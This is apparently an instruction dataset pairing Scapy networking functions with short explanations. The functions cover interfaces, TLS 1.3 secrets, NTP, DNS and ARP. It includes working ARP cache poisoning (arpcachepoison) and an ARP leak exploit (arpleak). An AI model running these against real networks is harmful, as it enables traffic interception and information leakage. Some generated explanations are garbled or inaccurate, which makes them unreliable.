getattr(iface, metric_name)\n        if ipv6:\n            _append_route6(routes, dest, netmask, nexthop,\n                           iface, lifaddr, metric)\n        else:\n            routes.append((atol(dest), itom(int(netmask)),\n                           nexthop, iface, ip, metric))\n    return routes", "response": "Reads Windows routes through a GetIpForwardTable2 call."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef in6_getifaddr():\n    ifaddrs = []\n    ip6s = get_ips(v6=True)\n    for iface in ip6s:\n        ips = ip6s[iface]\n        for ip in ips:\n            scope = in6_getscope(ip)\n            ifaddrs.append((ip, scope, iface))\n    # Appends Npcap loopback if available\n    if conf.use_npcap and scapy.consts.LOOPBACK_INTERFACE:\n        ifaddrs.append((\"::1\", 0, scapy.consts.LOOPBACK_INTERFACE))\n    return ifaddrs", "response": "Returns all IPv6 addresses found on the computer\n   "}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns an interface that works", "response": "def get_working_if():\n    \"\"\"Return an interface that works\"\"\"\n    try:\n        # return the interface associated with the route with smallest\n        # mask (route by default if it exists)\n        iface = min(conf.route.routes, key=lambda x: x[1])[3]\n    except ValueError:\n        # no route\n        iface = scapy.consts.LOOPBACK_INTERFACE\n    if iface.is_invalid():\n        # Backup mode: try them all\n        for iface in six.itervalues(IFACES):\n            if not iface.is_invalid():\n                return iface\n        return None\n    return iface"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nadd a route to 127. 0. 1 and :: 1 to simplify unit tests on Windows", "response": "def route_add_loopback(routes=None, ipv6=False, iflist=None):\n    \"\"\"Add a route to 127.0.0.1 and ::1 to simplify unit tests on Windows\"\"\"\n    if not WINDOWS:\n        warning(\"Not available\")\n        return\n    warning(\"This will completely mess up the routes. Testing purpose only !\")\n    # Add only if some adpaters already exist\n    if ipv6:\n        if not conf.route6.routes:\n            return\n    else:\n        if not conf.route.routes:\n            return\n    data = {\n        'name': scapy.consts.LOOPBACK_NAME,\n        'description': \"Loopback\",\n        'win_index': -1,\n        'guid': \"{0XX00000-X000-0X0X-X00X-00XXXX000XXX}\",\n        'invalid': True,\n        'mac': '00:00:00:00:00:00',\n        'ipv4_metric': 0,\n        'ipv6_metric': 0,\n        'ips': [\"127.0.0.1\", \"::\"]\n    }\n    adapter = NetworkInterface()\n    adapter.pcap_name = \"\\\\Device\\\\NPF_{0XX00000-X000-0X0X-X00X-00XXXX000XXX}\"\n    adapter.update(data)\n    adapter.invalid = False\n    adapter.ip = \"127.0.0.1\"\n    if iflist:\n        iflist.append(adapter.pcap_name)\n        return\n    # Remove all LOOPBACK_NAME routes\n    for route in list(conf.route.routes):\n        iface = route[3]\n        if iface.name == scapy.consts.LOOPBACK_NAME:\n            conf.route.routes.remove(route)\n    # Remove LOOPBACK_NAME interface\n    for devname, iface in list(IFACES.items()):\n        if iface.name == scapy.consts.LOOPBACK_NAME:\n            IFACES.pop(devname)\n    # Inject interface\n    IFACES[\"{0XX00000-X000-0X0X-X00X-00XXXX000XXX}\"] = adapter\n    scapy.consts.LOOPBACK_INTERFACE = adapter\n    if isinstance(conf.iface, NetworkInterface):\n        if conf.iface.name == scapy.consts.LOOPBACK_NAME:\n            conf.iface = adapter\n    if isinstance(conf.iface6, NetworkInterface):\n        if conf.iface6.name == scapy.consts.LOOPBACK_NAME:\n            conf.iface6 = adapter\n    conf.netcache.arp_cache[\"127.0.0.1\"] = \"ff:ff:ff:ff:ff:ff\"\n    conf.netcache.in6_neighbor[\"::1\"] = \"ff:ff:ff:ff:ff:ff\"\n    # Build the packed network addresses\n    loop_net = struct.unpack(\"!I\", socket.inet_aton(\"127.0.0.0\"))[0]\n    loop_mask = struct.unpack(\"!I\", socket.inet_aton(\"255.0.0.0\"))[0]\n    # Build the fake routes\n    loopback_route = (loop_net, loop_mask, \"0.0.0.0\", adapter, \"127.0.0.1\", 1)\n    loopback_route6 = ('::1', 128, '::', adapter, [\"::1\"], 1)\n    loopback_route6_custom = (\"fe80::\", 128, \"::\", adapter, [\"::1\"], 1)\n    if routes is None:\n        # Injection\n        conf.route6.routes.append(loopback_route6)\n        conf.route6.routes.append(loopback_route6_custom)\n        conf.route.routes.append(loopback_route)\n        # Flush the caches\n        conf.route6.invalidate_cache()\n        conf.route.invalidate_cache()\n    else:\n        if ipv6:\n            routes.append(loopback_route6)\n            routes.append(loopback_route6_custom)\n        else:\n            routes.append(loopback_route)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self, data):\n        self.data = data\n        self.name = data['name']\n        self.description = data['description']\n        self.win_index = data['win_index']\n        self.guid = data['guid']\n        self.mac = data['mac']\n        self.ipv4_metric = data['ipv4_metric']\n        self.ipv6_metric = data['ipv6_metric']\n        self.ips = data['ips']\n        if 'invalid' in data:\n            self.invalid = data['invalid']\n        # Other attributes are optional\n        self._update_pcapdata()\n\n        try:\n            # Npcap loopback interface\n            if conf.use_npcap:\n                pcap_name_loopback = _get_npcap_config(\"LoopbackAdapter\")\n                if pcap_name_loopback:  # May not be defined\n                    guid = _pcapname_to_guid(pcap_name_loopback)\n                    if self.guid == guid:\n                        # https://nmap.org/npcap/guide/npcap-devguide.html\n                        self.mac = \"00:00:00:00:00:00\"\n                        self.ip = \"127.0.0.1\"\n                        return\n        except KeyError:\n            pass\n\n        try:\n            self.ip = next(x for x in self.ips if \":\" not in x)\n        except StopIteration:\n            pass\n\n        try:\n            # Windows native loopback interface\n            if not self.ip and self.name == scapy.consts.LOOPBACK_NAME:\n                self.ip = \"127.0.0.1\"\n        except (KeyError, AttributeError, NameError) as e:\n            print(e)", "response": "Update the internal attributes of the object according to a dictionary."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef ismonitor(self):\n        if self.cache_mode is not None:\n            return self.cache_mode\n        try:\n            res = (self.mode() == \"monitor\")\n            self.cache_mode = res\n            return res\n        except Scapy_Exception:\n            return False", "response": "Returns True if the interface is in monitor mode."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef setmonitor(self, enable=True):\n        # We must reset the monitor cache\n        if enable:\n            res = self.setmode('monitor')\n        else:\n            res = self.setmode('managed')\n        if not res:\n            log_runtime.error(\"Npcap WlanHelper returned with an error code !\")\n        self.cache_mode = None\n        tmp = self.cache_mode = self.ismonitor()\n        return tmp if enable else (not tmp)", "response": "Alias for setmode ( monitor ) Only available with Npcap"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef setmode(self, mode):\n        # According to https://nmap.org/npcap/guide/npcap-devguide.html#npcap-feature-dot11  # noqa: E501\n        self._check_npcap_requirement()\n        _modes = {\n            0: \"managed\",\n            1: \"monitor\",\n            2: \"master\",\n            3: \"wfd_device\",\n            4: \"wfd_owner\",\n            5: \"wfd_client\"\n        }\n        m = _modes.get(mode, \"unknown\") if isinstance(mode, int) else mode\n        return self._npcap_set(\"mode\", m)", "response": "Set the interface mode."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef setmodulation(self, modu):\n        # According to https://nmap.org/npcap/guide/npcap-devguide.html#npcap-feature-dot11  # noqa: E501\n        self._check_npcap_requirement()\n        _modus = {\n            0: \"dsss\",\n            1: \"fhss\",\n            2: \"irbaseband\",\n            3: \"ofdm\",\n            4: \"hrdss\",\n            5: \"erp\",\n            6: \"ht\",\n            7: \"vht\",\n            8: \"ihv\",\n            9: \"mimo-ofdm\",\n            10: \"mimo-ofdm\",\n        }\n        m = _modus.get(modu, \"unknown\") if isinstance(modu, int) else modu\n        return self._npcap_set(\"modu\", str(m))", "response": "Set the interface modulation."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nperforms checks and restart pcap adapter", "response": "def _pcap_check(cls):\n        \"\"\"Performs checks/restart pcap adapter\"\"\"\n        if not conf.use_winpcapy:\n            # Winpcap/Npcap isn't installed\n            return\n\n        _detect = pcap_service_status()\n\n        def _ask_user():\n            if not conf.interactive:\n                return False\n            msg = \"Do you want to start it ? (yes/no) [y]: \"\n            try:\n                # Better IPython compatibility\n                import IPython\n                return IPython.utils.io.ask_yes_no(msg, default='y')\n            except (NameError, ImportError):\n                while True:\n                    _confir = input(msg)\n                    _confir = _confir.lower().strip()\n                    if _confir in [\"yes\", \"y\", \"\"]:\n                        return True\n                    elif _confir in [\"no\", \"n\"]:\n                        return False\n                return False\n        _error_msg = (\"No match between your pcap and windows \"\n                      \"network interfaces found. \")\n        if _detect:\n            # No action needed\n            return\n        else:\n            warning(\n                \"Scapy has detected that your pcap service is not running !\"\n            )\n            if not conf.interactive or _ask_user():\n                succeed = pcap_service_start(askadmin=conf.interactive)\n                if succeed:\n                    log_loading.info(\"Pcap service started !\")\n                    return\n            _error_msg = \"Could not start the pcap service ! \"\n        warning(_error_msg +\n                \"You probably won't be able to send packets. \"\n                \"Deactivating unneeded interfaces and restarting \"\n                \"Scapy might help. Check your winpcap/npcap installation \"\n                \"and access rights.\")"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn the first pcap device name for a given Windows device name.", "response": "def dev_from_name(self, name):\n        \"\"\"Return the first pcap device name for a given Windows\n        device name.\n        \"\"\"\n        try:\n            return next(iface for iface in six.itervalues(self)\n                        if (iface.name == name or iface.description == name))\n        except (StopIteration, RuntimeError):\n            raise ValueError(\"Unknown network interface %r\" % name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns Windows device name for given pcap device name.", "response": "def dev_from_pcapname(self, pcap_name):\n        \"\"\"Return Windows device name for given pcap device name.\"\"\"\n        try:\n            return next(iface for iface in six.itervalues(self)\n                        if iface.pcap_name == pcap_name)\n        except (StopIteration, RuntimeError):\n            raise ValueError(\"Unknown pypcap network interface %r\" % pcap_name)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef dev_from_index(self, if_index):\n        try:\n            if_index = int(if_index)  # Backward compatibility\n            return next(iface for iface in six.itervalues(self)\n                        if iface.win_index == if_index)\n        except (StopIteration, RuntimeError):\n            if str(if_index) == \"1\":\n                # Test if the loopback interface is set up\n                if isinstance(scapy.consts.LOOPBACK_INTERFACE, NetworkInterface):  # noqa: E501\n                    return scapy.consts.LOOPBACK_INTERFACE\n            raise ValueError(\"Unknown network interface index %r\" % if_index)", "response": "Return interface name from interface index"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreloading the internal list of the interface list", "response": "def reload(self):\n        \"\"\"Reload interface list\"\"\"\n        self.restarted_adapter = False\n        self.data.clear()\n        if conf.use_winpcapy:\n            # Reload from Winpcapy\n            from scapy.arch.pcapdnet import load_winpcapy\n            load_winpcapy()\n        self.load()\n        # Reload conf.iface\n        conf.iface = get_working_if()"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nprinting list of available network interfaces in human readable form", "response": "def show(self, resolve_mac=True, print_result=True):\n        \"\"\"Print list of available network interfaces in human readable form\"\"\"\n        res = []\n        for iface_name in sorted(self.data):\n            dev = self.data[iface_name]\n            mac = dev.mac\n            if resolve_mac and conf.manufdb:\n                mac = conf.manufdb._resolve_MAC(mac)\n            validity_color = lambda x: conf.color_theme.red if x else \\\n                conf.color_theme.green\n            description = validity_color(dev.is_invalid())(\n                str(dev.description)\n            )\n            index = str(dev.win_index)\n            res.append((index, description, str(dev.ip), mac))\n\n        res = pretty_list(res, [(\"INDEX\", \"IFACE\", \"IP\", \"MAC\")], sortBy=2)\n        if print_result:\n            print(res)\n        else:\n            return res"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef select(sockets, remain=None):\n        if remain is not None:\n            max_timeout = remain / len(sockets)\n            for s in sockets:\n                if s.timeout > max_timeout:\n                    s.timeout = max_timeout\n\n        # python-can sockets aren't selectable, so we return all of them\n        # sockets, None (means use the socket's recv() )\n        return sockets, None", "response": "This function is called during sendrecv routine to select the available sockets."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the right class for a given NTP packet.", "response": "def _ntp_dispatcher(payload):\n    \"\"\"\n    Returns the right class for a given NTP packet.\n    \"\"\"\n    # By default, calling NTP() will build a NTP packet as defined in RFC 5905\n    # (see the code of NTPHeader). Use NTPHeader for extension fields and MAC.\n    if payload is None:\n        return NTPHeader\n    else:\n        length = len(payload)\n        if length >= _NTP_PACKET_MIN_SIZE:\n            first_byte = orb(payload[0])\n            # Extract NTP mode\n            mode = first_byte & 7\n            return {6: NTPControl, 7: NTPPrivate}.get(mode, NTPHeader)\n    return conf.raw_layer"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef pre_dissect(self, s):\n        length = len(s)\n        if length < _NTP_PACKET_MIN_SIZE:\n            err = \" ({}\".format(length) + \" is < _NTP_PACKET_MIN_SIZE \"\n            err += \"({})).\".format(_NTP_PACKET_MIN_SIZE)\n            raise _NTPInvalidDataException(err)\n        return s", "response": "Check that the payload is long enough to build a NTP packet."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nguess the payload class based on the payload size.", "response": "def guess_payload_class(self, payload):\n        \"\"\"\n        Handles NTPv4 extensions and MAC part (when authentication is used.)\n        \"\"\"\n        plen = len(payload)\n\n        if plen > _NTP_AUTH_MD5_TAIL_SIZE:\n            return NTPExtensions\n        elif plen == _NTP_AUTH_MD5_TAIL_SIZE:\n            return NTPAuthenticator\n\n        return Packet.guess_payload_class(self, payload)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef snapshot(self):\n        snap = connState(connection_end=self.connection_end,\n                         read_or_write=self.row,\n                         seq_num=self.seq_num,\n                         compression_alg=type(self.compression),\n                         ciphersuite=type(self.ciphersuite),\n                         tls_version=self.tls_version)\n        snap.cipher = self.cipher.snapshot()\n        if self.hmac:\n            snap.hmac.key = self.hmac.key\n        return snap", "response": "Returns a new connState object with the current state of the current session."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef mirror(self):\n\n        self.ipdst, self.ipsrc = self.ipsrc, self.ipdst\n        self.dport, self.sport = self.sport, self.dport\n\n        self.rcs, self.wcs = self.wcs, self.rcs\n        if self.rcs:\n            self.rcs.row = \"read\"\n        if self.wcs:\n            self.wcs.row = \"write\"\n\n        self.prcs, self.pwcs = self.pwcs, self.prcs\n        if self.prcs:\n            self.prcs.row = \"read\"\n        if self.pwcs:\n            self.pwcs.row = \"write\"\n\n        self.triggered_prcs_commit, self.triggered_pwcs_commit = \\\n            self.triggered_pwcs_commit, self.triggered_prcs_commit\n\n        if self.connection_end == \"client\":\n            self.connection_end = \"server\"\n        elif self.connection_end == \"server\":\n            self.connection_end = \"client\"\n\n        return self", "response": "This function takes a TLSSession object and swaps the IP addresses ports connection ends and connection states."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef compute_tls13_early_secrets(self):\n        # we use the prcs rather than the pwcs in a totally arbitrary way\n        if self.prcs is None:\n            # too soon\n            return\n\n        hkdf = self.prcs.hkdf\n\n        self.tls13_early_secret = hkdf.extract(None,\n                                               self.tls13_psk_secret)\n\n        bk = hkdf.derive_secret(self.tls13_early_secret,\n                                b\"external psk binder key\",\n                                # \"resumption psk binder key\",\n                                b\"\")\n        self.tls13_derived_secrets[\"binder_key\"] = bk\n\n        if len(self.handshake_messages) > 1:\n            # these secrets are not defined in case of HRR\n            return\n\n        cets = hkdf.derive_secret(self.tls13_early_secret,\n                                  b\"client early traffic secret\",\n                                  b\"\".join(self.handshake_messages))\n        self.tls13_derived_secrets[\"client_early_traffic_secret\"] = cets\n\n        ees = hkdf.derive_secret(self.tls13_early_secret,\n                                 b\"early exporter master secret\",\n                                 b\"\".join(self.handshake_messages))\n        self.tls13_derived_secrets[\"early_exporter_secret\"] = ees\n\n        if self.connection_end == \"server\":\n            self.prcs.tls13_derive_keys(cets)\n        elif self.connection_end == \"client\":\n            self.pwcs.tls13_derive_keys(cets)", "response": "Computes the keys and IV for ClientHello and ClientHello messages."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef compute_tls13_handshake_secrets(self):\n        if self.tls13_early_secret is None:\n            warning(\"No early secret. This is abnormal.\")\n\n        hkdf = self.prcs.hkdf\n\n        self.tls13_handshake_secret = hkdf.extract(self.tls13_early_secret,\n                                                   self.tls13_dhe_secret)\n\n        chts = hkdf.derive_secret(self.tls13_handshake_secret,\n                                  b\"client handshake traffic secret\",\n                                  b\"\".join(self.handshake_messages))\n        self.tls13_derived_secrets[\"client_handshake_traffic_secret\"] = chts\n\n        shts = hkdf.derive_secret(self.tls13_handshake_secret,\n                                  b\"server handshake traffic secret\",\n                                  b\"\".join(self.handshake_messages))\n        self.tls13_derived_secrets[\"server_handshake_traffic_secret\"] = shts\n\n        if self.connection_end == \"server\":\n            self.prcs.tls13_derive_keys(chts)\n            self.pwcs.tls13_derive_keys(shts)\n        elif self.connection_end == \"client\":\n            self.pwcs.tls13_derive_keys(chts)\n            self.prcs.tls13_derive_keys(shts)", "response": "Computes the TLS13 - Handshaking secret for the current session."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef compute_tls13_traffic_secrets(self):\n        hkdf = self.prcs.hkdf\n\n        self.tls13_master_secret = hkdf.extract(self.tls13_handshake_secret,\n                                                None)\n\n        cts0 = hkdf.derive_secret(self.tls13_master_secret,\n                                  b\"client application traffic secret\",\n                                  b\"\".join(self.handshake_messages))\n        self.tls13_derived_secrets[\"client_traffic_secrets\"] = [cts0]\n\n        sts0 = hkdf.derive_secret(self.tls13_master_secret,\n                                  b\"server application traffic secret\",\n                                  b\"\".join(self.handshake_messages))\n        self.tls13_derived_secrets[\"server_traffic_secrets\"] = [sts0]\n\n        es = hkdf.derive_secret(self.tls13_master_secret,\n                                b\"exporter master secret\",\n                                b\"\".join(self.handshake_messages))\n        self.tls13_derived_secrets[\"exporter_secret\"] = es\n\n        if self.connection_end == \"server\":\n            # self.prcs.tls13_derive_keys(cts0)\n            self.pwcs.tls13_derive_keys(sts0)\n        elif self.connection_end == \"client\":\n            # self.pwcs.tls13_derive_keys(cts0)\n            self.prcs.tls13_derive_keys(sts0)", "response": "Computes the master and server secret of the TC1 and TC2."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef compute_tls13_resumption_secret(self):\n        if self.connection_end == \"server\":\n            hkdf = self.prcs.hkdf\n        elif self.connection_end == \"client\":\n            hkdf = self.pwcs.hkdf\n        rs = hkdf.derive_secret(self.tls13_master_secret,\n                                b\"resumption master secret\",\n                                b\"\".join(self.handshake_messages))\n        self.tls13_derived_secrets[\"resumption_secret\"] = rs", "response": "Computes the TLS13 resumption master secret for the server and client."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncomputing the next application traffic secret for the next application.", "response": "def compute_tls13_next_traffic_secrets(self):\n        \"\"\"\n        Ciphers key and IV are updated accordingly.\n        \"\"\"\n        hkdf = self.prcs.hkdf\n        hl = hkdf.hash.digest_size\n\n        cts = self.tls13_derived_secrets[\"client_traffic_secrets\"]\n        ctsN = cts[-1]\n        ctsN_1 = hkdf.expand_label(ctsN, \"application traffic secret\", \"\", hl)\n        cts.append(ctsN_1)\n\n        stsN_1 = hkdf.expand_label(ctsN, \"application traffic secret\", \"\", hl)\n        cts.append(stsN_1)\n\n        if self.connection_end == \"server\":\n            self.prcs.tls13_derive_keys(ctsN_1)\n            self.pwcs.tls13_derive_keys(stsN_1)\n        elif self.connection_end == \"client\":\n            self.pwcs.tls13_derive_keys(ctsN_1)\n            self.prcs.tls13_derive_keys(stsN_1)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef show2(self):\n        s = self.tls_session\n        rcs_snap = s.rcs.snapshot()\n        wcs_snap = s.wcs.snapshot()\n\n        s.rcs = self.rcs_snap_init\n\n        built_packet = raw(self)\n        s.frozen = True\n        self.__class__(built_packet, tls_session=s).show()\n        s.frozen = False\n\n        s.rcs = rcs_snap\n        s.wcs = wcs_snap", "response": "Show the TLS packet with the same context and then. show it."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _LLSGuessPayloadClass(p, **kargs):\n\n    cls = conf.raw_layer\n    if len(p) >= 3:\n        typ = struct.unpack(\"!H\", p[0:2])[0]\n        clsname = _OSPF_LLSclasses.get(typ, \"LLS_Generic_TLV\")\n        cls = globals()[clsname]\n    return cls(p, **kargs)", "response": "Guess the correct LLS class for a given payload"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nguess the correct OSPFv3 LSA class for a given payload", "response": "def _OSPFv3_LSAGuessPayloadClass(p, **kargs):\n    \"\"\" Guess the correct OSPFv3 LSA class for a given payload \"\"\"\n\n    cls = conf.raw_layer\n\n    if len(p) >= 6:\n        typ = struct.unpack(\"!H\", p[2:4])[0]\n        clsname = _OSPFv3_LSclasses.get(typ, \"Raw\")\n        cls = globals()[clsname]\n\n    return cls(p, **kargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the MAC address corresponding to a given IP address", "response": "def getmacbyip(ip, chainCC=0):\n    \"\"\"Return MAC address corresponding to a given IP address\"\"\"\n    if isinstance(ip, Net):\n        ip = next(iter(ip))\n    ip = inet_ntoa(inet_aton(ip or \"0.0.0.0\"))\n    tmp = [orb(e) for e in inet_aton(ip)]\n    if (tmp[0] & 0xf0) == 0xe0:  # mcast @\n        return \"01:00:5e:%.2x:%.2x:%.2x\" % (tmp[1] & 0x7f, tmp[2], tmp[3])\n    iff, _, gw = conf.route.route(ip)\n    if ((iff == consts.LOOPBACK_INTERFACE) or (ip == conf.route.get_if_bcast(iff))):  # noqa: E501\n        return \"ff:ff:ff:ff:ff:ff\"\n    if gw != \"0.0.0.0\":\n        ip = gw\n\n    mac = conf.netcache.arp_cache.get(ip)\n    if mac:\n        return mac\n\n    try:\n        res = srp1(Ether(dst=ETHER_BROADCAST) / ARP(op=\"who-has\", pdst=ip),\n                   type=ETH_P_ARP,\n                   iface=iff,\n                   timeout=2,\n                   verbose=0,\n                   chainCC=chainCC,\n                   nofilter=1)\n    except Exception:\n        return None\n    if res is not None:\n        mac = res.payload.hwsrc\n        conf.netcache.arp_cache[ip] = mac\n        return mac\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\npoisoning target s cache with ( your MAC victim s IP", "response": "def arpcachepoison(target, victim, interval=60):\n    \"\"\"Poison target's cache with (your MAC,victim's IP) couple\narpcachepoison(target, victim, [interval=60]) -> None\n\"\"\"\n    tmac = getmacbyip(target)\n    p = Ether(dst=tmac) / ARP(op=\"who-has\", psrc=victim, pdst=target)\n    try:\n        while True:\n            sendp(p, iface_hint=target)\n            if conf.verb > 1:\n                os.write(1, b\".\")\n            time.sleep(interval)\n    except KeyboardInterrupt:\n        pass"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ntrying to guess if target is in Promisc mode.", "response": "def is_promisc(ip, fake_bcast=\"ff:ff:00:00:00:00\", **kargs):\n    \"\"\"Try to guess if target is in Promisc mode. The target is provided by its ip.\"\"\"  # noqa: E501\n\n    responses = srp1(Ether(dst=fake_bcast) / ARP(op=\"who-has\", pdst=ip), type=ETH_P_ARP, iface_hint=ip, timeout=1, verbose=0, **kargs)  # noqa: E501\n\n    return responses is not None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsending ARP who - has requests to determine which hosts are in promiscuous mode", "response": "def promiscping(net, timeout=2, fake_bcast=\"ff:ff:ff:ff:ff:fe\", **kargs):\n    \"\"\"Send ARP who-has requests to determine which hosts are in promiscuous mode\n    promiscping(net, iface=conf.iface)\"\"\"\n    ans, unans = srp(Ether(dst=fake_bcast) / ARP(pdst=net),\n                     filter=\"arp and arp[7] = 2\", timeout=timeout, iface_hint=net, **kargs)  # noqa: E501\n    ans = ARPingResult(ans.res, name=\"PROMISCPing\")\n\n    ans.display()\n    return ans, unans"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef arpleak(target, plen=255, hwlen=255, **kargs):\n    # We want explicit packets\n    pkts_iface = {}\n    for pkt in ARP(pdst=target):\n        # We have to do some of Scapy's work since we mess with\n        # important values\n        iface = conf.route.route(pkt.pdst)[0]\n        psrc = get_if_addr(iface)\n        hwsrc = get_if_hwaddr(iface)\n        pkt.plen = plen\n        pkt.hwlen = hwlen\n        if plen == 4:\n            pkt.psrc = psrc\n        else:\n            pkt.psrc = inet_aton(psrc)[:plen]\n            pkt.pdst = inet_aton(pkt.pdst)[:plen]\n        if hwlen == 6:\n            pkt.hwsrc = hwsrc\n        else:\n            pkt.hwsrc = mac2str(hwsrc)[:hwlen]\n        pkts_iface.setdefault(iface, []).append(\n            Ether(src=hwsrc, dst=ETHER_BROADCAST) / pkt\n        )\n    ans, unans = SndRcvList(), PacketList(name=\"Unanswered\")\n    for iface, pkts in viewitems(pkts_iface):\n        ans_new, unans_new = srp(pkts, iface=iface, filter=\"arp\", **kargs)\n        ans += ans_new\n        unans += unans_new\n        ans.listname = \"Results\"\n        unans.listname = \"Unanswered\"\n    for _, rcv in ans:\n        if ARP not in rcv:\n            continue\n        rcv = rcv[ARP]\n        psrc = rcv.get_field('psrc').i2m(rcv, rcv.psrc)\n        if plen > 4 and len(psrc) > 4:\n            print(\"psrc\")\n            hexdump(psrc[4:])\n            print()\n        hwsrc = rcv.get_field('hwsrc').i2m(rcv, rcv.hwsrc)\n        if hwlen > 6 and len(hwsrc) > 6:\n            print(\"hwsrc\")\n            hexdump(hwsrc[6:])\n            print()\n    return ans, unans", "response": "Exploit ARP leak flaws like NetBSD - SA2017 -002."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nencodes a bytes string into the DNS format.", "response": "def dns_encode(x, check_built=False):\n    \"\"\"Encodes a bytes string into the DNS format\n\n    :param x: the string\n    :param check_built: detect already-built strings and ignore them\n    :returns: the encoded bytes string\n    \"\"\"\n    if not x or x == b\".\":\n        return b\"\\x00\"\n\n    if check_built and b\".\" not in x and (\n        orb(x[-1]) == 0 or (orb(x[-2]) & 0xc0) == 0xc0\n    ):\n        # The value has already been processed. Do not process it again\n        return x\n\n    # Truncate chunks that cannot be encoded (more than 63 bytes..)\n    x = b\"\".join(chb(len(y)) + y for y in (k[:63] for k in x.split(b\".\")))\n    if x[-1:] != b\"\\x00\":\n        x += b\"\\x00\"\n    return x"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nencode a list of integers representing Resource Records to a bitmap field.", "response": "def RRlist2bitmap(lst):\n    \"\"\"\n    Encode a list of integers representing Resource Records to a bitmap field\n    used in the NSEC Resource Record.\n    \"\"\"\n    # RFC 4034, 4.1.2. The Type Bit Maps Field\n\n    import math\n\n    bitmap = b\"\"\n    lst = [abs(x) for x in sorted(set(lst)) if x <= 65535]\n\n    # number of window blocks\n    max_window_blocks = int(math.ceil(lst[-1] / 256.))\n    min_window_blocks = int(math.floor(lst[0] / 256.))\n    if min_window_blocks == max_window_blocks:\n        max_window_blocks += 1\n\n    for wb in range(min_window_blocks, max_window_blocks + 1):\n        # First, filter out RR not encoded in the current window block\n        # i.e. keep everything between 256*wb <= 256*(wb+1)\n        rrlist = sorted(x for x in lst if 256 * wb <= x < 256 * (wb + 1))\n        if not rrlist:\n            continue\n\n        # Compute the number of bytes used to store the bitmap\n        if rrlist[-1] == 0:  # only one element in the list\n            bytes_count = 1\n        else:\n            max = rrlist[-1] - 256 * wb\n            bytes_count = int(math.ceil(max // 8)) + 1  # use at least 1 byte\n        if bytes_count > 32:  # Don't encode more than 256 bits / values\n            bytes_count = 32\n\n        bitmap += struct.pack(\"BB\", wb, bytes_count)\n\n        # Generate the bitmap\n        # The idea is to remove out of range Resource Records with these steps\n        # 1. rescale to fit into 8 bits\n        # 2. x gives the bit position ; compute the corresponding value\n        # 3. sum everything\n        bitmap += b\"\".join(\n            struct.pack(\n                b\"B\",\n                sum(2 ** (7 - (x - 256 * wb) + (tmp * 8)) for x in rrlist\n                    if 256 * wb + 8 * tmp <= x < 256 * wb + 8 * tmp + 8),\n            ) for tmp in range(bytes_count)\n        )\n\n    return bitmap"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef dyndns_add(nameserver, name, rdata, type=\"A\", ttl=10):\n    zone = name[name.find(\".\") + 1:]\n    r = sr1(IP(dst=nameserver) / UDP() / DNS(opcode=5,\n                                             qd=[DNSQR(qname=zone, qtype=\"SOA\")],  # noqa: E501\n                                             ns=[DNSRR(rrname=name, type=\"A\",\n                                                       ttl=ttl, rdata=rdata)]),\n            verbose=0, timeout=5)\n    if r and r.haslayer(DNS):\n        return r.getlayer(DNS).rcode\n    else:\n        return -1", "response": "Send a DNS add message to a nameserver for name to have a new rdata"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _convert_seconds(self, packed_seconds):\n        seconds = struct.unpack(\"!H\", packed_seconds[:2])[0]\n        seconds += struct.unpack(\"!I\", packed_seconds[2:])[0]\n        return seconds", "response": "Unpack the internal representation."}
